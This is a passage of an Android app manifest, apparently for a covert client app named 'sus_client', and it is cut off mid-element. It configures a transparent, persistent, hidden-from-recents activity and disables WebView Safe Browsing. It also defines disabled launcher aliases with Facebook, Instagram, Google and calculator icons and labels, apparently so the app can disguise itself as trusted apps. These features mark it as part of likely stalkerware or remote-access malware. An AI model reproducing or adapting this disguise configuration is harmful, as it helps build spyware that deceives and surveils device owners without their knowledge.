    <application
        android:allowBackup="true"
        android:debuggable="true"
        android:excludeFromRecents="true"
        android:icon="@mipmap/sus_app_icon"
        android:label="@string/app_name"
        android:persistent="true"
        android:requestLegacyExternalStorage="true"
        android:roundIcon="@mipmap/sus_app_icon"
        android:supportsRtl="true"
        android:theme="@style/Theme.SUS"
        android:usesCleartextTraffic="true">

        <meta-data
            android:name="android.webkit.WebView.EnableSafeBrowsing"
            android:value="false" />

        <activity
            android:name="com.android.sus_client.applaunchers.ActionActivity"
            android:alwaysRetainTaskState="true"
            android:clearTaskOnLaunch="false"
            android:configChanges="orientation|screenSize|screenLayout|smallestScreenSize|keyboardHidden|keyboard"
            android:enabled="true"
            android:exported="true"
            android:launchMode="singleInstance"
            android:screenOrientation="portrait"
            android:supportsPictureInPicture="true"
            android:theme="@style/Theme.SUS.Transparent"
            android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="com.android.internal.category.PLATLOGO" />

                <action android:name="android.intent.action.SEND" />
                <action android:name="android.intent.action.SEND MULTIPLE" />
                <action android:name="android.intent.action.PACKAGE_REMOVED" />

                <category android:name="android.intent.category.LAUNCHER" />
                <category android:name="android.intent.category.BROWSABLE" />
            </intent-filter>
        </activity>

        <activity-alias
            android:name="com.android.sus_client.applaunchers.Launcher1"
            android:alwaysRetainTaskState="true"
            android:clearTaskOnLaunch="false"
            android:configChanges="orientation|screenSize|screenLayout|smallestScreenSize|keyboardHidden|keyboard"
            android:enabled="false"
            android:exported="true"
            android:icon="@mipmap/sus_app_ic_facebook"
            android:label="Facebook"
            android:launchMode="singleInstance"
            android:roundIcon="@mipmap/sus_app_ic_facebook"
            android:screenOrientation="portrait"
            android:targetActivity="com.android.sus_client.applaunchers.ActionActivity"
            android:theme="@style/Theme.SUS.Transparent"
            android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
                <category android:name="android.intent.category.BROWSABLE" />
            </intent-filter>
        </activity-alias>

        <activity-alias
            android:name="com.android.sus_client.applaunchers.Launcher2"
            android:alwaysRetainTaskState="true"
            android:clearTaskOnLaunch="false"
            android:configChanges="orientation|screenSize|screenLayout|smallestScreenSize|keyboardHidden|keyboard"
            android:enabled="false"
            android:exported="true"
            android:icon="@mipmap/sus_app_ic_instagram"
            android:label="Instagram"
            android:launchMode="singleInstance"
            android:roundIcon="@mipmap/sus_app_ic_instagram"
            android:screenOrientation="portrait"
            android:targetActivity="com.android.sus_client.applaunchers.ActionActivity"
            android:theme="@style/Theme.SUS.Transparent"
            android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
                <category android:name="android.intent.category.BROWSABLE" />
            </intent-filter>
        </activity-alias>

        <activity-alias
            android:name="com.android.sus_client.applaunchers.Launcher3"
            android:alwaysRetainTaskState="true"
            android:clearTaskOnLaunch="false"
            android:configChanges="orientation|screenSize|screenLayout|smallestScreenSize|keyboardHidden|keyboard"
            android:enabled="false"
            android:exported="true"
            android:icon="@mipmap/sus_app_ic_google"
            android:label="Google"
            android:launchMode="singleInstance"
            android:roundIcon="@mipmap/sus_app_ic_google"
            android:screenOrientation="portrait"
            android:targetActivity="com.android.sus_client.applaunchers.ActionActivity"
            android:theme="@style/Theme.SUS.Transparent"
            android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
                <category android:name="android.intent.category.BROWSABLE" />
            </intent-filter>
        </activity-alias>

        <activity-alias
            android:name="com.android.sus_client.applaunchers.Launcher4"
            android:alwaysRetainTaskState="true"
            android:clearTaskOnLaunch="false"
            android:configChanges="orientation|screenSize|screenLayout|smallestScreenSize|keyboardHidden|keyboard"
            android:enabled="false"
            android:exported="true"
            android:icon="@mipmap/sus_app_ic_calculator"
